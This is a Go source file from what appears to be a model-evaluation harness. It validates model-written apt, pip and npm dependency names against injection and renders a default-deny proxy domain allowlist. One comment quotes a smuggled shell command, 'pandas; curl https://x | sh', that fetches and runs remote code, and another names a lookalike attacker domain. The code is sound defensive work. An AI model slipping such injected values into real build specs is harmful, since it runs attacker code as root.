package imagespec

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"github.com/skael-dev/skael/internal/eval/spec"
)

// ErrUnsafeDep is a dependency that cannot safely reach a RUN instruction.
var ErrUnsafeDep = errors.New("imagespec: unsafe dependency")

// An ordinary package name across apt, pip and npm. Shell syntax is outside it,
// and so is a leading dash — a dep is not a place to pass "--index-url".
var depPattern = regexp.MustCompile(`^@?[A-Za-z0-9][A-Za-z0-9._+/-]*(?:(?:==|@|=)[A-Za-z0-9][A-Za-z0-9._+-]*)?$`)

// ValidateDeps is a security boundary, not a tidiness check: these strings come
// from a model-authored spec and are interpolated into a RUN instruction, so
// "pandas; curl https://x | sh" would execute at build time, as root.
func ValidateDeps(d spec.DepsDecl) error {
	for _, group := range []struct {
		name string
		vals []string
	}{{"apt", d.Apt}, {"pip", d.Pip}, {"npm", d.Npm}} {
		for _, v := range group.vals {
			if v == "" {
				return fmt.Errorf("%w: empty %s dependency", ErrUnsafeDep, group.name)
			}
			if strings.Contains(v, "..") {
				return fmt.Errorf("%w: %s dependency %q contains a path traversal", ErrUnsafeDep, group.name, v)
			}
			if !depPattern.MatchString(v) {
				return fmt.Errorf("%w: %s dependency %q is not a plain package name", ErrUnsafeDep, group.name, v)
			}
		}
	}
	return nil
}

// A hostname, optionally dot-prefixed for a subdomain wildcard. The allowlist
// enforces network policy, so a value carrying proxy-configuration syntax is
// rejected rather than escaped.
var domainPattern = regexp.MustCompile(`^\.?[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)+$`)

// ProxyConfig renders the allowlist proxy's configuration and filter file,
// concatenated with the filter after a "#--- filter ---" marker so a driver can
// split them. Default-deny: a domain absent from the list is refused.
func ProxyConfig(allow []string) (string, error) {
	if len(allow) == 0 {
		return "", errors.New("imagespec: an allowlist proxy needs at least one domain")
	}
	for _, d := range allow {
		if !domainPattern.MatchString(d) {
			return "", fmt.Errorf("imagespec: %q is not a hostname", d)
		}
	}

	conf, err := baseFS.ReadFile("base/tinyproxy.conf.tmpl")
	if err != nil {
		panic(fmt.Sprintf("imagespec: %v", err))
	}

	var b strings.Builder
	b.Write(conf)
	b.WriteString("\n" + FilterMarker + "\n")
	for _, d := range sorted(allow) {
		// The filter is a regexp list. Anchored, so "api.anthropic.com" does not
		// permit "api.anthropic.com.evil.example"; quoted, so its dots stay
		// literal and do not admit "api-anthropic.com".
		fmt.Fprintf(&b, "(^|\\.)%s$\n", regexp.QuoteMeta(strings.TrimPrefix(d, ".")))
	}
	return b.String(), nil
}

// FilterMarker separates the proxy configuration from its filter file in
// ProxyConfig's output.
const FilterMarker = "#--- filter ---"
